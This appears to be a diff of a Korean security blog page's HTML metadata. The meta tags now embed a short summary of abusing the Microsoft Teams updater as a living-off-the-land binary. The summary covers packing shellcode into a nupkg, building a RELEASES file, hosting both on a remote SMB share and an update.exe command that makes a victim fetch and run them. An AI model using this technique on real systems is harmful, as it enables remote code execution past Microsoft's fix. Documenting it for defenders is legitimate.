@@ -13,15 +13,59 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="hack &amp; life">
+  <meta name="description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/&#34;&gt;Microsoft Teams Updater Living off the Land&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;MS Teams Updater&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;Microsoft Teams&amp;#xC758; &amp;#xC5C5;&amp;#xB370;&amp;#xC774;&amp;#xD2B8; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC744; lolbas(Living off the land binary and script)&amp;#xB85C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xC804;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB358; code execution&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810; &amp;#xC218;&amp;#xC815;&amp;#xC740; URL&amp;#xC744; &amp;#xD1B5;&amp;#xD558;&amp;#xC5EC; &amp;#xC5C5;&amp;#xB370;&amp;#xC774;&amp;#xD2B8; &amp;#xAE30;&amp;#xB2A5;&amp;#xC744; &amp;#xC81C;&amp;#xD55C;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC5C5;&amp;#xB370;&amp;#xC774;&amp;#xD2B8; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC740; &amp;#xC81C;&amp;#xD488; &amp;#xC5C5;&amp;#xB370;&amp;#xC774;&amp;#xD2B8;&amp;#xB97C; &amp;#xC704;&amp;#xD574; &amp;#xACF5;&amp;#xC720;/&amp;#xB85C;&amp;#xCEEC; &amp;#xD3F4;&amp;#xB354;&amp;#xB97C; &amp;#xD1B5;&amp;#xD55C; &amp;#xB85C;&amp;#xCEEC; &amp;#xC5F0;&amp;#xACB0;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xC6D0;&amp;#xACA9; SMB &amp;#xACF5;&amp;#xC720; &amp;#xD3F4;&amp;#xB354;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xD574;&amp;#xB2F9; &amp;#xD328;&amp;#xCE58;&amp;#xB97C; &amp;#xC6B0;&amp;#xD68C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xC774; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xC545;&amp;#xC6A9;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD55C; payload&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD558;&amp;#xB294; &amp;#xB2E8;&amp;#xACC4;&amp;#xB294; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;%localappdata%\Microsoft\Teams\packages&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; Microsoft Teams pre-built package&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; nupkg &amp;#xD328;&amp;#xD0A4;&amp;#xC9C0; &amp;#xCD94;&amp;#xCD9C;(ex. Teams-1.3.00.27559-full.nupkg)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;Teams-1.3.00.27559-full.nupkg\lib\net45&lt;/code&gt;&amp;#xC5D0; shellcode&amp;#xB97C; &lt;code&gt;squirrel.exe&lt;/code&gt; &amp;#xD30C;&amp;#xC77C;&amp;#xB85C; &amp;#xB123;&amp;#xC740; &amp;#xD6C4; &amp;#xC555;&amp;#xCD95;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;metadata &amp;#xACC4;&amp;#xC0B0;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sha1sum Teams-1.3.00.27559-full.nupkg.nupkg &amp;amp;&amp;amp; wc -c &amp;lt; Teams-1.3.00.27559-full.nupkg&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;output:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;fa8b87f0b995498a6e890c832dcaf968997608d4 Teams-1.3.00.27559-full.nupkg 4695&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;RELEASES&lt;/code&gt; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC0DD;&amp;#xC131;&amp;#xD55C; &amp;#xD6C4; &amp;#xC704;&amp;#xC758; &amp;#xACB0;&amp;#xACFC; &amp;#xAC12;&amp;#xC744; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD574;&amp;#xC11C; &amp;#xC800;&amp;#xC7A5;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;Teams-1.3.00.27559-full.nupkg&lt;/code&gt;&amp;#xC640; &lt;code&gt;RELEASES&lt;/code&gt; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xBA54;&amp;#xC778; &amp;#xB514;&amp;#xB809;&amp;#xD130;&amp;#xB9AC;&amp;#xC5D0; &amp;#xB123;&amp;#xACE0; &amp;#xC6D0;&amp;#xACA9; SMB &amp;#xC11C;&amp;#xBC84;&amp;#xC5D0; &amp;#xC5C5;&amp;#xB85C;&amp;#xB4DC;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&amp;#xD53C;&amp;#xD574;&amp;#xC790;&amp;#xAC00; &amp;#xC544;&amp;#xB798; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xD574;&amp;#xCEE4;&amp;#xC758; &amp;#xC6D0;&amp;#xACA9; SMB &amp;#xC11C;&amp;#xBC84;&amp;#xB85C; update&amp;#xB97C; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xBA74; Microsoft Teams&amp;#xC5D0; &amp;#xC758;&amp;#xD574; &amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC;&amp;#xB418;&amp;#xACE0; &amp;#xC2E4;&amp;#xD589;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs taggerscript&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%localappdata%&lt;/span&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;hljs-symbol&#34;&gt;\T&lt;/span&gt;eams&lt;span class=&#34;hljs-symbol&#34;&gt;\u&lt;/span&gt;pdate.exe --update = &lt;span class=&#34;hljs-symbol&#34;&gt;\\&lt;/span&gt; remoteserver&lt;span class=&#34;hljs-symbol&#34;&gt;\p&lt;/span&gt;ayloadFolder&lt;/code&gt;&lt;/pre&gt; - hack &amp; life">
   <meta name="author" content="j0dev, y2sman">
   <meta name="keywords" content>
   <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
 
   <meta property="og:type" content="website"> 
   <meta property="og:title" content="[하루한줄] Microsoft Teams Updater Living off the Land - hackyboiz">
-  <meta property="og:description" content="hack &amp; life">
-  <meta property="og:image" content="/img/favicon.ico">
+  <meta property="og:description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/&#34;&gt;Microsoft Teams Updater Living off the Land&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;MS Teams Updater&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;Microsoft Teams&amp;#xC758; &amp;#xC5C5;&amp;#xB370;&amp;#xC774;&amp;#xD2B8; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC744; lolbas(Living off the land binary and script)&amp;#xB85C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xC804;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB358; code execution&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810; &amp;#xC218;&amp;#xC815;&amp;#xC740; URL&amp;#xC744; &amp;#xD1B5;&amp;#xD558;&amp;#xC5EC; &amp;#xC5C5;&amp;#xB370;&amp;#xC774;&amp;#xD2B8; &amp;#xAE30;&amp;#xB2A5;&amp;#xC744; &amp;#xC81C;&amp;#xD55C;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC5C5;&amp;#xB370;&amp;#xC774;&amp;#xD2B8; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC740; &amp;#xC81C;&amp;#xD488; &amp;#xC5C5;&amp;#xB370;&amp;#xC774;&amp;#xD2B8;&amp;#xB97C; &amp;#xC704;&amp;#xD574; &amp;#xACF5;&amp;#xC720;/&amp;#xB85C;&amp;#xCEEC; &amp;#xD3F4;&amp;#xB354;&amp;#xB97C; &amp;#xD1B5;&amp;#xD55C; &amp;#xB85C;&amp;#xCEEC; &amp;#xC5F0;&amp;#xACB0;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xC6D0;&amp;#xACA9; SMB &amp;#xACF5;&amp;#xC720; &amp;#xD3F4;&amp;#xB354;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xD574;&amp;#xB2F9; &amp;#xD328;&amp;#xCE58;&amp;#xB97C; &amp;#xC6B0;&amp;#xD68C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xC774; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xC545;&amp;#xC6A9;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD55C; payload&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD558;&amp;#xB294; &amp;#xB2E8;&amp;#xACC4;&amp;#xB294; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;%localappdata%\Microsoft\Teams\packages&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; Microsoft Teams pre-built package&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; nupkg &amp;#xD328;&amp;#xD0A4;&amp;#xC9C0; &amp;#xCD94;&amp;#xCD9C;(ex. Teams-1.3.00.27559-full.nupkg)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;Teams-1.3.00.27559-full.nupkg\lib\net45&lt;/code&gt;&amp;#xC5D0; shellcode&amp;#xB97C; &lt;code&gt;squirrel.exe&lt;/code&gt; &amp;#xD30C;&amp;#xC77C;&amp;#xB85C; &amp;#xB123;&amp;#xC740; &amp;#xD6C4; &amp;#xC555;&amp;#xCD95;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;metadata &amp;#xACC4;&amp;#xC0B0;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sha1sum Teams-1.3.00.27559-full.nupkg.nupkg &amp;amp;&amp;amp; wc -c &amp;lt; Teams-1.3.00.27559-full.nupkg&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;output:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;fa8b87f0b995498a6e890c832dcaf968997608d4 Teams-1.3.00.27559-full.nupkg 4695&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;RELEASES&lt;/code&gt; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC0DD;&amp;#xC131;&amp;#xD55C; &amp;#xD6C4; &amp;#xC704;&amp;#xC758; &amp;#xACB0;&amp;#xACFC; &amp;#xAC12;&amp;#xC744; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD574;&amp;#xC11C; &amp;#xC800;&amp;#xC7A5;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;Teams-1.3.00.27559-full.nupkg&lt;/code&gt;&amp;#xC640; &lt;code&gt;RELEASES&lt;/code&gt; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xBA54;&amp;#xC778; &amp;#xB514;&amp;#xB809;&amp;#xD130;&amp;#xB9AC;&amp;#xC5D0; &amp;#xB123;&amp;#xACE0; &amp;#xC6D0;&amp;#xACA9; SMB &amp;#xC11C;&amp;#xBC84;&amp;#xC5D0; &amp;#xC5C5;&amp;#xB85C;&amp;#xB4DC;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&amp;#xD53C;&amp;#xD574;&amp;#xC790;&amp;#xAC00; &amp;#xC544;&amp;#xB798; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xD574;&amp;#xCEE4;&amp;#xC758; &amp;#xC6D0;&amp;#xACA9; SMB &amp;#xC11C;&amp;#xBC84;&amp;#xB85C; update&amp;#xB97C; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xBA74; Microsoft Teams&amp;#xC5D0; &amp;#xC758;&amp;#xD574; &amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC;&amp;#xB418;&amp;#xACE0; &amp;#xC2E4;&amp;#xD589;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs taggerscript&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%localappdata%&lt;/span&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;hljs-symbol&#34;&gt;\T&lt;/span&gt;eams&lt;span class=&#34;hljs-symbol&#34;&gt;\u&lt;/span&gt;pdate.exe --update = &lt;span class=&#34;hljs-symbol&#34;&gt;\\&lt;/span&gt; remoteserver&lt;span class=&#34;hljs-symbol&#34;&gt;\p&lt;/span&gt;ayloadFolder&lt;/code&gt;&lt;/pre&gt; - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io/img/1day1line.png">
   <meta property="og:url" content="https://hackyboiz.github.io/">
 
   <link rel="canonical" href="https://hackyboiz.github.io/2020/12/17/idioth/2020-12-17/">
@@ -283,11 +327,11 @@
                   
                   <a class="hover-with-bg" href="/tags/idioth/">idioth</a>
                   
-                  <a class="hover-with-bg" href="/tags/teams/">teams</a>
-                  
                   <a class="hover-with-bg" href="/tags/lolbin/">lolbin</a>
                   
                   <a class="hover-with-bg" href="/tags/lolbas/">lolbas</a>
+                  
+                  <a class="hover-with-bg" href="/tags/teams/">teams</a>
                   
                 </div>
                 
